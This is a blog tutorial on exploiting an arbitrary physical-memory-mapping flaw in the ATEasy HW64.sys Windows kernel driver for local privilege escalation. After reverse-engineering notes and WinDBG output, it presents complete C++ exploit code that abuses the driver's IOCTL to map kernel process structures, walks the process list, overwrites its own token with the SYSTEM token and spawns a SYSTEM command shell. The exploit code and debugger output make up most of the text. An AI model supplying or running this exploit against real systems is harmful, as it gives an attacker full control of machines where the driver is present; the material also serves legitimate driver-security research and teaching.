---
title: Arbitrary Memory Mapping x64 To Local Privilege Escalation
author: rashidkhanpathan
date: 2019-08-11 00:34:00 +0800
categories: [Blogging, Tutorial]
tags: [favicon]
---

Welcome everyone, in this post we are going to exploit Arbitrary Memory Mapping and leading this to Local Privilege Escalation to gain NT Authority Shell, the driver we gonna exploit is from ATEasy `HW64.sys` version: 5.0.1.0 this is good real-life target to exploit this Vulnerability also it gonna help you to hunt on other real-life Window Kernel Drivers so let's hunt begin

before procedding further i wanna say thanks to following people who have helped me lot through their blog posts and resources, this post re-writeup of @xte - vulndev.io 's post by reading his post i was able to write my own exploit and understood nature of vulnerability
- @VoidSec  - voidsec.com
- @xte - from vulndev.io
- @parvez anwar - from grayhathacker.com
- @james forshaw - from Google Security Team

## Reverse Enginnering Driver
before going to the exploitation part we have to reverse enginner the driver for understanding vulnerability in depth to understand how it actually occur we need to open driver in IDA, i would highly recommend you to read this writeup from [VoidSec](https://voidsec.com/windows-drivers-reverse-engineering-methodology/)

the starting points for our driver:
- MmMapIoSpace
- MmMapLockedPages
- rdmsr (Read MSR)
- wrmsr (Write MSR)

```c++
PVOID MmMapIoSpace(
  [in] PHYSICAL_ADDRESS    PhysicalAddress,
  [in] SIZE_T              NumberOfBytes,
  [in] MEMORY_CACHING_TYPE CacheType
);
```
`MmMapIoSpace` is a function provided by the Windows kernel that allows a user-mode application to map physical memory into its virtual address space. This function is typically used when interacting with hardware devices or accessing memory-mapped I/O (input/output) regions. It's essential for low-level system programming and device driver development if we look on Micorosoft API Docs - The `MmMapIoSpace` routine maps the given physical address range to nonpaged system space You you read more on  [Microsoft's Windows Driver Apis Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace)


also check this function out
MmMapLockedPages
```c++
PVOID MmMapLockedPages(
  [in] PMDL MemoryDescriptorList,
  [in] __drv_strictType(KPROCESSOR_MODE / enum _MODE,__drv_typeConst)KPROCESSOR_MODE AccessMode
);
```
The MmMapLockedPages routine maps the physical pages that are described by a given MDL, this function calls `IoAllocateMdl`


```c++
PMDL IoAllocateMdl(
  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,
  [in]                ULONG                  Length,
  [in]                BOOLEAN                SecondaryBuffer,
  [in]                BOOLEAN                ChargeQuota,
  [in, out, optional] PIRP                   Irp
);
 
void MmBuildMdlForNonPagedPool(
  [in, out] PMDL MemoryDescriptorList
);
```
The `IoAllocateMdl` routine allocates a memory descriptor list (MDL) large enough to map a buffer, given the buffer's starting address and length. Optionally, this routine associates the MDL with an IRP.

if the 3 functions are executed in the order described, we create a second virtual address that maps to the same physical address as the initial virtual address

In summary, the functions MmMapIoSpace and MmMapLockedPages are powerful memory mapping functions used in Windows kernel-mode programming, particularly in device driver development. These functions allow for the mapping of physical memory to virtual memory addresses, which can be valuable for hardware interaction. However, it's essential to understand their behavior and potential security implications:

`MmMapIoSpace`:
- `Purpose`: Maps a physical memory address to a virtual kernel-mode address.
- `Use Cases`: Useful when you can control the arguments via IOCTLs. However, it should be done with caution, and the mapped memory should not be exposed to user-mode code unless necessary.
- `Security Implications`: If the mapped memory is exposed to user-mode code and not properly protected, it can be exploited, leading to security vulnerabilities. It can also crash the system if an invalid address is mapped.


`MmMapLockedPages`:
- `Purpose`: Maps a virtual address to another virtual address and takes a Memory Descriptor List (MDL) as an input.
- `Preparation Steps`: Preceded by calls to IoAllocateMdl and MmBuildMdlForNonPagedPool to create an MDL that describes the virtual memory and its corresponding physical pages.
- `Use Cases`: Useful for creating a second virtual address that maps to the same physical address as the initial virtual address, allowing for multiple accesses to the same physical memory.
- `Security Implications`: When used improperly or exposed to user-mode code, it can lead to memory access violations and security vulnerabilities. Microsoft has deprecated this function, suggesting safer alternatives


now let's see in practically

In IDA there is Tab called Imports, in imports we have to find `MmMapIoSpace` now right cliking on this function gonna open windows to multilple functions we have select first to follow the chain

```c++
  if ( a4 && (a3 || !*((_DWORD *)a2 + 3)) && !(unsigned int)sub_1800030F0(a1, *a2, *((unsigned int *)a2 + 2)) )
    return 3221225473i64;
  if ( a3 )
  {
    v11 = MmMapIoSpace(*a2, *((unsigned int *)a2 + 2), 0i64);
    *((_DWORD *)a2 + 3) = v11;
    if ( (_DWORD)v11 )
      return 0i64;
    else
      return 3221225473i64;
  }
  else if ( *((_DWORD *)a2 + 3) )
  {
    v12 = *((int *)a2 + 3);
    if ( *((_DWORD *)a2 + 3) && *((_DWORD *)a2 + 3) <= 0x100u )
      v12 = sub_180002670(a1, (unsigned int)(*((_DWORD *)a2 + 3) - 1));
    Mdl = IoAllocateMdl(v12, *((unsigned int *)a2 + 2), 0i64, 0i64, 0i64);
    if ( Mdl
      && (MmBuildMdlForNonPagedPool(Mdl),
          LOBYTE(v5) = 1,
          (*((_DWORD *)a2 + 3) = *(_DWORD *)(Mdl + 44) + (MmMapLockedPages(Mdl, v5) & 0xFFFFF000)) != 0) )
    {
      *a2 = Mdl;
      return 0i64;
    }
    else
    {
      if ( Mdl )
        IoFreeMdl(Mdl);
      return 0xFFFFFFFFi64;
    }
  }
```

Now we have found the function successfully but we need to fund IOCTL which execute this function, by digging little bit in IDA for IOCTLs i have found function that has IOCTL which leading to our Vulnerable Functions




#### Exploit Writing:

Now we have understand the vulnerability let's craft the exploit for it to get shell, to craft an exploit we need few things first Driver name, IOCTL that reaches our Vulnerable Function


first let's open driver using `CreateFileA` Function
```c++
#include "windows.h"
#include <stdio.h>
#include <Psapi.h>
#include <String.h>
#include <stdlib.h>

#define DRIVERNAME "\\\\.\\HW"
#define QWORD ULONGLONG
#define IOCTL 0x9C406500

int main()
{
	DWORD index = 0;
	DWORD bytesWritten = 0;
	// Interact With Driver Handle Using
	HANDLE hDriver = CreateFileA(DRIVERNAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Error - While Creating Device Driver \n", GetLastError());
		exit(-1);
	}
    print("[+] SuccessFully Interacted With Driver \n", hDriver);
}
```
by running forllowing code we should get this output if it's not worked then check if your driver is loaded or not properly, you can check this using `Process Hacker` tool, if it's not loaded then use `OSRLoader` to load the driver then run the exploit again it should work and gonna print this output
```batch
C:\Users\Rashid\Desktop\>LPEexploit.exe
[+] SuccessFully Interacted With Driver 0xFFFF
```

now lets write add more code to our exploit, this code is for sending buffer to our driver to crash it, after the `printf` add these lines of code and build it

```c++
	// Sending Buffer To Driver
	LPVOID uInBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPVOID uOutBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Preparing Input Data To Send
	QWORD*in = (QWORD*)((QWORD)uInBuf);
	*(in + index++) = 0x4141414142424242;
	*(in + index++) = 0x4343434344444444;
	*(in + index++) = 0x4545454546464646;

    DeviceIoControl(hDriver, IOCTL, (LPVOID)uInBuf, 0x1000, uOutBuf, 0x1000, &bytesWritten, NULL);

	return 0;
```
after adding these lines of code, our first block of code which is for driver opening and our later part of code which for sending buffer to driver gonna look like this after combining them

```c++
#include "windows.h"
#include <stdio.h>
#include <Psapi.h>
#include <String.h>
#include <stdlib.h>

#define DRIVERNAME "\\\\.\\HW"
#define QWORD ULONGLONG
#define IOCTL 0x9C406500

int main()
{
	DWORD index = 0;
	DWORD bytesWritten = 0;
	// Interact With Driver Handle Using
	HANDLE hDriver = CreateFileA(DRIVERNAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Error - While Creating Device Driver \n", GetLastError());
		exit(-1);
	}
	
	// Sending Buffer To Driver
	LPVOID uInBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPVOID uOutBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Preparing Input Data To Send
	QWORD*in = (QWORD*)((QWORD)uInBuf);
	*(in + index++) = 0x4141414142424242;
	*(in + index++) = 0x4343434344444444;
	*(in + index++) = 0x4545454546464646;

    // Interacting With IOCTL Using DeviceIoControl
	DeviceIoControl(hDriver, IOCTL, (LPVOID)uInBuf, 0x1000, uOutBuf, 0x1000, &bytesWritten, NULL);

	return 0;
}
```
now build it and before running our compiled exploit we need to set breakpoint in WinDBG inWinDBG set breakpint on `hw64`
```batch
0: kd> bp e1 hw64
```
now run our exploit, as soon as we run our exploit we are able to see our breakpoint has been hit in WinDBG and it's

```batch
0: kd>.reload
0: kd> lm m hw64
Browse full module list
start             end                 module name
fffff806`5c1a0000 fffff806`5c1aa000   hw64       (deferred)
0: kd> ba e1 hw64+0x3F70
0: kd> g
..
Breakpoint 0 hit
hw64+0x3f70:
fffff806`5c1a3f70 81bc24b40000000065409c cmp dword ptr [rsp+0B4h],9C406500h
```
also if we look inside Disassembly view we can see our IOCTL with Driver Name is showing
```batch
fffff805`1e8061c8 0f1f840000000000 nop     dword ptr [rax+rax]
nt!DbgUserBreakPoint:
fffff805`1e8061d0 cc              int     3
fffff805`1e8061d1 c3              ret
fffff805`1e8061d2 cc              int     3
fffff805`1e8061d3 cc              int     3
fffff805`1e8061d4 cc              int     3
fffff805`1e8061d5 cc              int     3
fffff805`1e8061d6 cc              int     3
fffff805`1e8061d7 cc              int     3
fffff805`1e8061d8 0f1f840000000000 nop     dword ptr [rax+rax]
nt!DbgBreakPointWithStatus:
fffff805`1e8061e0 cc              int     3
fffff805`1e8061e1 c3              ret
nt!DbgBreakPointWithStatusEnd:
fffff805`1e8061e2 cc              int     3
fffff805`1e8061e3 cc              int     3
fffff805`1e8061e4 cc              int     3
fffff805`1e8061e5 cc              int     3
fffff805`1e8061e6 cc              int     3
fffff805`1e8061e7 cc              int     3
fffff805`1e8061e8 0f1f840000000000 nop     dword ptr [rax+rax]
nt!DebugPrint:
fffff805`1e8061f0 458bc8          mov     r9d,r8d
fffff805`1e8061f3 448bc2          mov     r8d,edx
fffff805`1e8061f6 668b11          mov     dx,word ptr [rcx]
fffff805`1e8061f9 488b4908        mov     rcx,qword ptr [rcx+8]
fffff805`1e8061fd b801000000      mov     eax,1
fffff805`1e806202 cd2d            int     2Dh
fffff805`1e806204 cc              int     3
fffff805`1e806205 c3              ret
fffff805`1e806206 cc              int     3
fffff805`1e806207 cc              int     3
fffff805`1e806208 cc              int     3
fffff805`1e806209 cc              int     3
fffff805`1e80620a cc              int     3
fffff805`1e80620b cc              int     3
fffff805`1e80620c 0f1f4000        nop     dword ptr [rax]
nt!DebugPrompt:
fffff805`1e806210 66448b4a02      mov     r9w,word ptr [rdx+2]
fffff805`1e806215 4c8b4208        mov     r8,qword ptr [rdx+8]
fffff805`1e806219 668b11          mov     dx,word ptr [rcx]
fffff805`1e80621c 488b4908        mov     rcx,qword ptr [rcx+8]
fffff805`1e806220 b802000000      mov     eax,2
fffff805`1e806225 cd2d            int     2Dh
```

now after pressing G In WinDBG we should get an BSOD in our VM showing that PAGE_FAULT_IN_NONPAGED_AREA
```batch
PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.  This cannot be protected by try-except.
Typically the address is just plain bad or it is pointing at freed memory.
Arguments:
Arg1: ffffa9a2a2a32320, memory referenced.
```
so at this point we know that by sending those buffer using our exploit crashing the system and we have `Arbitrary Memory Mapping` vulnerability but we just don't want to crash the system, we want to get full system `NT Authority` shell

After having discovered the vulnerable IOCTL it’s time to start the exploitation process. Assuming we can map any kernel virtual address into a user-mode address – what could a good target be? A commonly used payload for kernel exploits is token stealing shellcode. We do not really need shellcode for escalating privileges though because we can copy the token of a SYSTEM process to our current process using the mapping mechanism as a read/write primitive (data-only attack). Executing shellcode is also possible but not in scope for this post. The plan of attack is as follows:

- Get the address of a SYSTEM process and read the Token pointer
- Get the address of our current process and overwrite the Token pointer with the one from the SYSTEM process

We can use NtQuerySystemInformation to get the address of a SYSTEM process in memory without using any exploit. We are then going to use our mapping primitive to map the memory where the process is located to a user-mode address. This allows us to read the fields of the EPROCESS structure including the Token, UniqueProcessId and ActiveProcessLinks, of which we can get offsets via the debugger:

```batch
1: kd> dt _EPROCESS
ntdll!_EPROCESS
   ....
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   ...
   +0x4b8 Token            : _EX_FAST_REF
   ...
```

We are updating the PoC to map the SYSTEM process & compare that the data of the mapped area & the original virtual address are indeed the same:

```c++
#include "windows.h"
#include <stdio.h>
 
#define QWORD ULONGLONG
#define IOCTL_01 0x9C406500
 
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2
 
using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
 
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
 
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
 
typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
    DWORD ProfileSource,
    PULONG Interval
);
 
QWORD getSystemEProcess() {
    ULONG returnLenght = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[0];
    return (QWORD)handleInfo.Object;
}
 
QWORD mapArbMem(QWORD addr, HANDLE hDriver) {
    DWORD index = 0;
    DWORD bytesWritten = 0;
    LPVOID uInBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID uOutBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
    QWORD* in = (QWORD*)((QWORD)uInBuf);
    *(in + index++) = 0x4141414142424242;
    *(in + index++) = 0x4343434300001000; // size
    *(in + index++) = addr;               // addr
 
    DeviceIoControl(hDriver, IOCTL_01, (LPVOID)uInBuf, 0x1000, uOutBuf, 0x1000, &bytesWritten, NULL);
    QWORD* out = (QWORD*)((QWORD)uOutBuf);
    QWORD mapped = *(out + 2);
    return mapped;
}
 
int main() {
    HANDLE hDriver = CreateFile(L"\\\\.\\HW", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }       
 
    printf("[>] Exploiting driver..\n");
    QWORD systemProc = getSystemEProcess();
    printf("System Process: %llx\n", systemProc);
 
    QWORD systemProcMap = mapArbMem(systemProc, hDriver);    
    printf("System Process Mapping: %llx\n", systemProcMap);
 
    getchar();
    DebugBreak();
    return 0;
}
```

As expected, we got a mapping of the target address. We did not cover the output buffer yet – essentially if we inspect it after triggering the IOCTL with valid arguments we get something like the following back, which has the mapped user-mode address as the 3rd value:

`ffff850127c16970 4343434300001000 1ce40870040 00000000 ...`

At this point, all that is left to do is read the SYSTEM token and then iterate through the ActiveProcessLinks linked list until we find our own process. When we find it, we overwrite our own Token with the SYSTEM one and are done. The final exploit implementing this can be found below:

```c++
#include "windows.h"
#include <stdio.h>

#define QWORD ULONGLONG
#define IOCTL_01 0x9C406500
 
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2
 
using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
 
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
 
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
 
typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
    DWORD ProfileSource,
    PULONG Interval
);
 
QWORD getSystemEProcess() {
    ULONG returnLenght = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[0];
    return (QWORD)handleInfo.Object;
}
 
QWORD mapArbMem(QWORD addr, HANDLE hDriver) {
    DWORD index = 0;
    DWORD bytesWritten = 0;
    LPVOID uInBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID uOutBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
    QWORD* in = (QWORD*)((QWORD)uInBuf);
    *(in + index++) = 0x4141414142424242;
    *(in + index++) = 0x4343434300001000; // size
    *(in + index++) = addr;               // addr
 
    DeviceIoControl(hDriver, IOCTL_01, (LPVOID)uInBuf, 0x1000, uOutBuf, 0x1000, &bytesWritten, NULL);
    QWORD* out = (QWORD*)((QWORD)uOutBuf);
    QWORD mapped = *(out + 2);
    return mapped;
}
 
int main() {
    HANDLE hDriver = CreateFile(L"\\\\.\\HW", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }    
 
    printf("[>] Exploiting driver..\n");
    QWORD systemProc = getSystemEProcess();
    QWORD systemProcMap = mapArbMem(systemProc, hDriver);
    QWORD systemToken = (QWORD)(*(QWORD*)(systemProcMap + 0x4b8));
    printf("[>] System Token: 0x%llx\n", systemToken);
 
    DWORD currentProcessPid = GetCurrentProcessId();
    BOOL found = false;
    QWORD cMapping = systemProcMap;
    DWORD cPid = 0;
    QWORD cTokenPtr = 0;
    while (!found) {
        QWORD readAt = (QWORD)(*(QWORD*)(cMapping + 0x448)); 
        cMapping = mapArbMem(readAt - 0x448, hDriver);
        cPid = (DWORD)(*(DWORD*)(cMapping + 0x440));
        cTokenPtr = (QWORD)(*(QWORD*)(cMapping + 0x4b8));
        if (cPid == currentProcessPid) {
            found = true;
            break;
        }
    }
    if (!found) {
        exit(-1);
    }
    printf("[>] Stealing Token..\n");
    *(QWORD*)(cMapping + 0x4b8) = systemToken;
    system("cmd");
    printf("[>] Restoring Token..\n");
    *(QWORD*)(cMapping + 0x4b8) = cTokenPtr;
```
Finally We have a NT Authority Shell

## References:
[Windows IOCTL Documentation](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol)
[Creating Device Drivers for Windows](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/)
[Windows Driver Development](https://docs.microsoft.com/en-us/windows-hardware/drivers/developingdrivers/)


## Conclusion:
In this blog post, we've explored how to interact with hardware devices using IOCTL in Windows. We've covered the essential steps, from opening a handle to the driver to sending an IOCTL request with input data. Keep in mind that the specific IOCTL values and data structures may vary depending on the driver and hardware device you're working with. Always ensure that you have the necessary permissions and legal rights to interact with drivers and hardware devices.
